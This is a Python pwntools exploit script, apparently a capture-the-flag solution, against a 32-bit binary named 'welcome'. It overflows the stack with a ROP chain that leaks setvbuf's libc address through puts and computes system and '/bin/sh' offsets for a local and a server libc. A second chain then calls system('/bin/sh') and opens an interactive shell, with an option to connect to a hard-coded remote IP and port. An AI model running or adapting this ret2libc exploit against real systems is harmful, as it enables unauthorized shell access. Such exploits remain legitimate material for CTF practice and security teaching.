#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template welcome
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('welcome')
context.terminal = ['gnome-terminal', '-e']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("131.114.59.19", 8195, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
gef config context.nb_lines_stack 40
tbreak *0x8049200
continue
'''.format(**locals())

exe_beginning = 0x08048000
got_plt_addr = exe_beginning + 0x4000
setvbuf_got_plt_addr = got_plt_addr + 0x14

main_addr = 0x080491b7
puts_addr = 0x08049030
nop_ret_addr = 0x080490af

max_num_addr = 27
addr_len = 4

payload1 = dict()
payload2 = dict()

for i in range(27):
    payload1[i*addr_len] = p32(nop_ret_addr)

    payload2[i*addr_len] = p32(nop_ret_addr)

payload1[23*addr_len] = p32(puts_addr)
payload1[24*addr_len] = p32(main_addr)
payload1[25*addr_len] = p32(setvbuf_got_plt_addr)

payload1 = fit(payload1)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()


header = io.recvline()
print(header)
io.sendline(payload1)

io.recvuntil("\n")

libc_setvbuf = u32(io.recvuntil("\xf7").ljust(4, b"\x00"))
#libc_beginning = libc_setvbuf - 0x00071530 #Mio
libc_beginning = libc_setvbuf - 0x00067ac0 #Server
#libc_binsh = libc_beginning + 0x18e32b #Mio
libc_binsh = libc_beginning + 0x17b8cf #Server
#libc_system = libc_beginning + 0x00044a00 #Mio
libc_system = libc_beginning + 0x0003cd10 #Server
log.info("libc base address: %x" % (libc_beginning))


payload2[23*addr_len] = p32(libc_system)
payload2[24*addr_len] = p32(0x11111111)
payload2[25*addr_len] = p32(libc_binsh)

payload2 = fit(payload2)

io.recvline()
io.sendline(payload2)

io.interactive()

